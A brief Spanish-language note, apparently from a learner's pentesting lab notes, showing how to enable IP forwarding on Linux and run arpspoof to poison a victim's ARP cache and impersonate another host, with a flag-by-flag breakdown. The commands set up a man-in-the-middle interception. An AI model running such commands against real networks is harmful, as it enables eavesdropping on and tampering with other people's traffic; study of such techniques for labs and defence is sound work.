
Habilitar el reenvío de paquetes IP (IP forwarding), que permite que tu máquina Linux **actúe como router**, reenviando tráfico entre interfaces de red.

```
echo  1 > /proc/sys/net/ipv4/ip_forward
```

ARP Spoof
```
>arpspoof -i eth1 -t 10.10.12.37 -r 10.10.12.36
```

## 🔍 Desglose del comando:

- `arpspoof` → Herramienta para hacer ARP spoofing.
    
- `-i eth1` → Especifica la interfaz de red que se usará (en este caso, `eth1`).
    
- `-t 10.10.12.37` → Indica la **víctima (target)** del ataque.
    
- `-r 10.10.12.36` → Indica la **IP que vas a suplantar (redirected host)**.
